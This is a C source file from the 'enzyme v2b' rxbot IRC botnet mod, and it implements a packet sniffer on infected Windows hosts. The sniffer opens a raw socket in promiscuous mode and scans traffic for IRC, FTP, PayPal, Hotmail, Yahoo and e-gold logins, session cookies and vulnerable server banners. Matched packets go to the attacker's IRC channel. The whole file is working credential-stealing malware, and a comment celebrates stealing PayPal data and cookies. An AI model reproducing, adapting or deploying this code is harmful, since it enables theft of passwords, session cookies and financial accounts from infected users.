/*
 XXXXX   XXXXXX   XXXXXXX   XXX XXX XXXXXXX   XXXXX
XXX XXX  XXX XXX  XX  XXX   XXX XXX XXXXXXXX XXX XXX
XXXXXXX  XXX XXX     XXX    XXX XXX XXXXXXXX XXXXXXX
XXX      XXX XXX   XXX      XXX XXX XXXXXXXX XXX
XXX XXX  XXX XXX  XXX  XX    XXXXX  XXXXXXXX XXX XXX
 XXXXX   XXX XXX  XXXXXXX      XXX  XXX  XXX  XXXXX
                              XXX               .v2b
                           XXXXX
 ____________________
+ enzyme ..v2b       +
| nzm rxbot mod ..   |
| private release *  |
| 04.26.05	         |
+____________________+
		      ____________________
 		     + code from ..       +
		     | bcuzz              |
		     | stoney  		      |
		     | x-lock	          |
		     | ionix              |
		     | phatty		      |
		     | nesespray	      |
		     | rbot dev team 	  |
		     +____________________+
 ____________________
+ read ..            +
| the docs           |
| don't ..           |
| mass distribute    |
+____________________+

*/



#include "../../headers/includes.h"
#include "../../headers/functions.h"
#include "../../headers/externs.h" 

#ifndef NO_SNIFFER 
#define SIO_RCVALL _WSAIOW(IOC_VENDOR,1) 

struct tcp_hdr_sniffer { 
    u_short     th_sport;               /* source port */ 
    u_short     th_dport;               /* destination port */ 
    u_long      th_seq;                 /* sequence number */ 
    u_long      th_ack;                 /* acknowledgement number */ 
    u_int       th_x2:4,                /* unused */ 
                th_off:4;               /* data offset */ 
    u_char      th_flags;               /* flags field */ 
    u_short     th_win;                 /* window size */ 
    u_short     th_sum;                 /* tcp checksum */ 
    u_short     th_urp;                 /* urgent pointer */ 
}; 

in_addr &to_in_addr(unsigned long lHost) 
{   static in_addr ina; ina.s_addr=lHost; return ina; } 

bool IsSuspiciousBot(const char *szBuf) { 
   if(strstr(szBuf, "Bot sniff")) return false; 
   if(strstr(szBuf, channel)) return false; 
   if(strstr(szBuf, "[PSNIFF]:")) return false; 
   if(strstr(szBuf, "PSNIFF//")) return false; 
   if(strstr(szBuf, "JOIN #")) return true; 
   if(strstr(szBuf, "302 ")) return true; 
   if(strstr(szBuf, "366 ")) return true; 
   if(strstr(szBuf, ":.login")) return true; 
   if(strstr(szBuf, ":!login")) return true; 
   if(strstr(szBuf, ":!Login")) return true; 
   if(strstr(szBuf, ":.Login")) return true; 
   if(strstr(szBuf, ":.ident")) return true; 
   if(strstr(szBuf, ":!ident")) return true; 
   if(strstr(szBuf, ":.hashin")) return true; 
   if(strstr(szBuf, ":!hashin")) return true; 
   if(strstr(szBuf, ":.secure")) return true; 
   if(strstr(szBuf, ":!secure")) return true; 
   if(strstr(szBuf, ":.auth")) return true; 
   if(strstr(szBuf, ":!auth")) return true; 
   if(strstr(szBuf, "login ")) return true; 
   if(strstr(szBuf, "auth ")) return true; 
   if(strstr(szBuf, ":.id ")) return true; 
   if(strstr(szBuf, ":!id ")) return true; 
   if(strstr(szBuf, "id")) return true; 
   if(strstr(szBuf, "ident")) return true; 
   if(strstr(szBuf, "\1HASH\1")) return true; 
   if(strstr(szBuf, ":.l")) return true; 
   if(strstr(szBuf, ":!l")) return true; 
   if(strstr(szBuf, ":$l")) return true; 
   if(strstr(szBuf, " CDKey (")) return true; 
   if(strstr(szBuf, "Pan Attacking")) return true; 
   if(strstr(szBuf, "Packets")) return true; 
   if(strstr(szBuf, "packets")) return true; 
   if(strstr(szBuf, "packeting")) return true; 
   if(strstr(szBuf, "sending")) return true; 
//   if(strstr(szBuf, "ddos")) return true; 
//   if(strstr(szBuf, "syn")) return true; 
//   if(strstr(szBuf, "syn3")) return true; 
//   if(strstr(szBuf, "flood")) return true; 
//   if(strstr(szBuf, ".x")) return true; 
//   if(strstr(szBuf, "!x")) return true; 
//   if(strstr(szBuf, "random")) return true; 
   return false; } 

bool IsSuspiciousIRC(const char *szBuf) { 
   if(strstr(szBuf, "IRC sniff")) return false; 
   //if(strstr(szBuf, g_pMainCtrl->m_sUserName.CStr())) return false; 
   if(strstr(szBuf, channel)) return false; 
   if(strstr(szBuf, "OPER ")) return true; 
   if(strstr(szBuf, "NICK ")) return true; 
   if(strstr(szBuf, "oper ")) return true; 
   if(strstr(szBuf, "VNC ")) return true; 
   if(strstr(szBuf, "vnc ")) return true; 
   if(strstr(szBuf, "bnc ")) return true; 
   if(strstr(szBuf, "BNC ")) return true; 
   if(strstr(szBuf, "You are now an IRC Operator")) return true; 
   return false; } 

bool IsSuspiciousFTP(const char *szBuf) { 
   if(strstr(szBuf, "FTP sniff")) return false; 
   if(strstr(szBuf, channel)) return false; 
   if(strstr(szBuf, "NICK ")) return false; 
   if(strstr(szBuf, "220 ")) return true; 
   if(strstr(szBuf, "230 ")) return true; 
   if(strstr(szBuf, "USER ")) return true; 
   if(strstr(szBuf, "PASS ")) return true; 
   return false; } 

// Like paypals? ;-D How about cookies? YUMMEH! -rain 

bool IsSuspiciousHTTP(const char *szBuf) { 
   if(strstr(szBuf, "HTTP sniff")) return false; 
   if(strstr(szBuf, channel)) return false; 
   if(strstr(szBuf, "paypal")) return true; 
   if(strstr(szBuf, "PAYPAL")) return true; 
   if(strstr(szBuf, "PAYPAL.COM")) return true; 
   if(strstr(szBuf, "paypal.com")) return true; 
   if(strstr(szBuf, "hotmail")) return true; 
   if(strstr(szBuf, "HOTMAIL")) return true; 
   if(strstr(szBuf, "HOTMAIL.COM")) return true; 
   if(strstr(szBuf, "hotmail.com")) return true; 
   if(strstr(szBuf, "privatefeeds")) return true; 
   if(strstr(szBuf, "PRIVATEFEEDS")) return true; 
   if(strstr(szBuf, "PRIVATEFEEDS.COM")) return true; 
   if(strstr(szBuf, "privatefeeds.com")) return true; 
   if(strstr(szBuf, "egold")) return true; 
   if(strstr(szBuf, "EGOLD")) return true; 
   if(strstr(szBuf, "EGOLD.COM")) return true; 
   if(strstr(szBuf, "egold.com")) return true;
   if(strstr(szBuf, "yahoo")) return true; 
   if(strstr(szBuf, "YAHOO")) return true; 
   if(strstr(szBuf, "YAHOO.COM")) return true; 
   if(strstr(szBuf, "yahoo.com")) return true; 
   if(strstr(szBuf, "Set-Cookie:")) return true; 
   return false; } 

bool IsSuspiciousVULN(const char *szBuf) { 
   if(strstr(szBuf, "VULN sniff")) return false; 
   if(strstr(szBuf, channel)) return false; 
   if(strstr(szBuf, "OpenSSL/0.9.6")) return true; 
   if(strstr(szBuf, "Serv-U FTP Server")) return true; 
   if(strstr(szBuf, "OpenSSH_2")) return true; 
   return false; } 

DWORD WINAPI SnifferThread(LPVOID param) { 
   SNIFFER sniff = *((SNIFFER *)param); 
   SNIFFER *sniffs = (SNIFFER *)param; 
   sniffs->gotinfo = TRUE; 

   char sendbuf[IRCLINE]; 
   int sock; sockaddr_in addr_in; hostent *hEnt; 
   IPHEADER *ipHeader; tcp_hdr_sniffer *tcpHeader; char *szPacket; 
   char szName[255]={0}; unsigned long lLocalIp; 
   addr_in.sin_family=AF_INET; addr_in.sin_port=0; addr_in.sin_addr.s_addr=0; 
   fgethostname(szName, sizeof(szName)); hEnt=fgethostbyname(szName); 
   memcpy(&lLocalIp, hEnt->h_addr_list[0], hEnt->h_length); 
   addr_in.sin_addr.s_addr=lLocalIp; 

   sock=fsocket(AF_INET,SOCK_RAW,IPPROTO_IP); 

   if(sock==INVALID_SOCKET) return NULL; 
   if(fbind(sock, (sockaddr*)&addr_in, sizeof(sockaddr))==SOCKET_ERROR) { 
      sprintf(sendbuf, "-\x03\x34\2sniffer\2\x03- bind() failed, returned %d", fWSAGetLastError()); 
      if (!sniff.silent) irc_privmsg(sniff.sock, sniff.chan, sendbuf, sniff.notice); 
      addlog(sendbuf); 
      fclosesocket(sock); 
      clearthread(sniff.threadnum); 
      ExitThread(0); 
   } 

   int optval=1; DWORD dwBytesRet; 
   if(fWSAIoctl(sock, SIO_RCVALL, &optval, sizeof(optval), NULL, 0, &dwBytesRet, NULL, NULL)==SOCKET_ERROR) 
   { 
      sprintf(sendbuf, "-\x03\x34\2sniffer\2\x03- WSAIoctl() failed, returned %d", fWSAGetLastError()); 
      if (!sniff.silent) irc_privmsg(sniff.sock, sniff.chan, sendbuf, sniff.notice); 
      addlog(sendbuf); 
      fclosesocket(sock); 
      clearthread(sniff.threadnum); 
      ExitThread(0); 
   } 

   char szRecvBuf[65535]; ipHeader=(IPHEADER*)szRecvBuf; int iRead; 

   while(1) 
   { 
      // Clear the buffer 
      memset(szRecvBuf, 0, sizeof(szRecvBuf)); iRead=0; 

      // Read the raw packet 
      iRead=frecv(sock, szRecvBuf, sizeof(szRecvBuf), 0); 

      // Process if its a TCP/IP packet 
      if(ipHeader->proto==6) 
      {   tcpHeader=(tcp_hdr_sniffer*)(szRecvBuf+sizeof(*ipHeader)); 
         int iSrcPort, iDestPort; char szSrcHost[2048], szDestHost[2048]; 
         iSrcPort=ntohs(tcpHeader->th_sport); iDestPort=ntohs(tcpHeader->th_dport); 
          
         if(iSrcPort !=110 && iSrcPort!=25 && 
            iDestPort !=110 && iDestPort!=25) 
         { 
         sprintf(szSrcHost, "%s", inet_ntoa(to_in_addr(ipHeader->sourceIP))); 
         sprintf(szDestHost, "%s", inet_ntoa(to_in_addr(ipHeader->destIP))); 

         szPacket=(char*)(szRecvBuf+sizeof(*tcpHeader)+sizeof(*ipHeader)); 
         for(int i=0; i<(int)strlen(szPacket); i++) { 
            if(szPacket[i]=='\r') szPacket[i]='\x20'; 
            if(szPacket[i]=='\n') szPacket[i]='\x20'; } 

         if(iSrcPort!=80 && iDestPort!=80 && IsSuspiciousBot(szPacket)) 
         { 
            _snprintf(sendbuf, sizeof(sendbuf), "-\x03\x34\2sniffer\2\x03- Bot sniff \"%s:%d\" to \"%s:%d\": - \"%s\"", szSrcHost, iSrcPort, szDestHost, iDestPort, szPacket); 
            if (!sniff.silent) irc_privmsg(sniff.sock, sniff.chan, sendbuf, sniff.notice); 
         } 


         else if(iSrcPort!=80 && iDestPort!=80 && IsSuspiciousIRC(szPacket)) 
         { 
            _snprintf(sendbuf, sizeof(sendbuf), "-\x03\x34\2sniffer\2\x03- IRC sniff \"%s:%d\" to \"%s:%d\": - \"%s\"", szSrcHost, iSrcPort, szDestHost, iDestPort, szPacket); 
            if (!sniff.silent) irc_privmsg(sniff.sock, sniff.chan, sendbuf, sniff.notice); 
         } 

         else if(iSrcPort!=80 && iDestPort!=80 && IsSuspiciousFTP(szPacket)) 
         { 
            _snprintf(sendbuf, sizeof(sendbuf), "-\x03\x34\2sniffer\2\x03- FTP sniff \"%s:%d\" to \"%s:%d\": - \"%s\"", szSrcHost, iSrcPort, szDestHost, iDestPort, szPacket); 
            if (!sniff.silent) irc_privmsg(sniff.sock, sniff.chan, sendbuf, sniff.notice); 
         } 

         else if(IsSuspiciousHTTP(szPacket)) 
         { 
            _snprintf(sendbuf, sizeof(sendbuf), "-\x03\x34\2sniffer\2\x03- HTTP sniff \"%s:%d\" to \"%s:%d\": - \"%s\"", szSrcHost, iSrcPort, szDestHost, iDestPort, szPacket); 
            if (!sniff.silent) irc_privmsg(sniff.sock, sniff.chan, sendbuf, sniff.notice); 
         } 
         else if(IsSuspiciousVULN(szPacket)) 
         { 
            _snprintf(sendbuf, sizeof(sendbuf), "-\x03\x34\2sniffer\2\x03- VULN sniff \"%s:%d\" to \"%s:%d\": - \"%s\"", szSrcHost, iSrcPort, szDestHost, iDestPort, szPacket); 
            if (!sniff.silent) irc_privmsg(sniff.sock, sniff.chan, sendbuf, sniff.notice); 
         } 
      } 
   } 
   } 
   fclosesocket(sock); 
   clearthread(sniff.threadnum); 
   ExitThread(0); 
   return 0; 
} 
#endif